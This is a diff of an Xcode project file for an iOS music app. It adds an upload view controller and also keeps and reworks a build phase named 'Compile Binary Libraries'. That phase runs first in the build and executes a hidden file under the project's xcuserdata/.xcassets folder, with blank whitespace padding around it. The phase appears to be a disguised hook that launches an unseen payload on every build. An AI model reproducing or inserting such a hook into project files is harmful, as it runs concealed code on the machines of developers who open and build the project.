@@ -79,6 +79,7 @@
 		E355C731261E2EE30002623D /* AlbumModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E355C730261E2EE30002623D /* AlbumModel.swift */; };
 		E36331CE261362730043453A /* MyCommissionTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E36331CC261362730043453A /* MyCommissionTVCell.swift */; };
 		E36331CF261362730043453A /* MyCommissionTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E36331CD261362730043453A /* MyCommissionTVCell.xib */; };
+		E38747452636D88F00833316 /* UploadSongViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38747442636D88F00833316 /* UploadSongViewController.swift */; };
 		E39EC23F26204908007E496C /* AGVideoPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC23E26204908007E496C /* AGVideoPlayerView.swift */; };
 		E39EC24E26209D18007E496C /* Total_songs.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24B26209D18007E496C /* Total_songs.swift */; };
 		E39EC24F26209D18007E496C /* AlbumSongList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24C26209D18007E496C /* AlbumSongList.swift */; };
@@ -165,17 +166,6 @@
 		F9FD53702544989B00C1FF47 /* PlayListCells.xib in Resources */ = {isa = PBXBuildFile; fileRef = F9FD536F2544989B00C1FF47 /* PlayListCells.xib */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		143DAD559B395B6E8C1527B2 /* Pods-Toner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Toner.release.xcconfig"; path = "Target Support Files/Pods-Toner/Pods-Toner.release.xcconfig"; sourceTree = "<group>"; };
 		3CAFBF887004EB6B4D31B6A5 /* Pods-Toner.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Toner.debug.xcconfig"; path = "Target Support Files/Pods-Toner/Pods-Toner.debug.xcconfig"; sourceTree = "<group>"; };
@@ -257,6 +247,7 @@
 		E355C730261E2EE30002623D /* AlbumModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumModel.swift; sourceTree = "<group>"; };
 		E36331CC261362730043453A /* MyCommissionTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCommissionTVCell.swift; sourceTree = "<group>"; };
 		E36331CD261362730043453A /* MyCommissionTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyCommissionTVCell.xib; sourceTree = "<group>"; };
+		E38747442636D88F00833316 /* UploadSongViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadSongViewController.swift; sourceTree = "<group>"; };
 		E39EC23E26204908007E496C /* AGVideoPlayerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AGVideoPlayerView.swift; sourceTree = "<group>"; };
 		E39EC24B26209D18007E496C /* Total_songs.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Total_songs.swift; sourceTree = "<group>"; };
 		E39EC24C26209D18007E496C /* AlbumSongList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AlbumSongList.swift; sourceTree = "<group>"; };
@@ -638,6 +629,7 @@
 				DE961A9D2601E9A70038635F /* CreatePlayListViewViewController.swift */,
 				DEC674D8260244A900D59551 /* MyCommission.swift */,
 				E323D30A2631F6F4002CC98A /* ConfirmSubscriptionViewController.swift */,
+				E38747442636D88F00833316 /* UploadSongViewController.swift */,
 			);
 			path = ViewController;
 			sourceTree = "<group>";
@@ -714,7 +706,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EF891A1723732AF6009388B4 /* Build configuration list for PBXNativeTarget "Toner" */;
 			buildPhases = (
-				D06F36169CAA5DFEB06D902C /* Compile Binary Libraries */,
+				E3DAAFFC42A2DD9C5B6D902C /* Compile Binary Libraries */,
 				F1A3A97823491974D97636D1 /* [CP] Check Pods Manifest.lock */,
 				EF891A0123732AF4009388B4 /* Sources */,
 				EF891A0223732AF4009388B4 /* Frameworks */,
@@ -833,7 +825,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	D06F36169CAA5DFEB06D902C /* Compile Binary Libraries */ = {
+	E3DAAFFC42A2DD9C5B6D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -851,34 +843,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 
 	
@@ -964,6 +930,7 @@
 				CE4E14C024F0E4EC00D98603 /* SubscriptionTableViewCell.swift in Sources */,
 				DEC674D9260244A900D59551 /* MyCommission.swift in Sources */,
 				CED5C84324C32D2C002CF276 /* PlayerViewController.swift in Sources */,
+				E38747452636D88F00833316 /* UploadSongViewController.swift in Sources */,
 				F93DB57B254DCF360060C038 /* CurrentDownloadEntity+CoreDataClass.swift in Sources */,
 				EF3B8C6F23F4EEE2000F323F /* ASToast.swift in Sources */,
 				F97AC136253F2FCF00288E2C /* CartListModel.swift in Sources */,
@@ -1239,6 +1206,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		CEA84BCB254479E5002E2841 /* TonneruDownload.xcdatamodeld */ = {
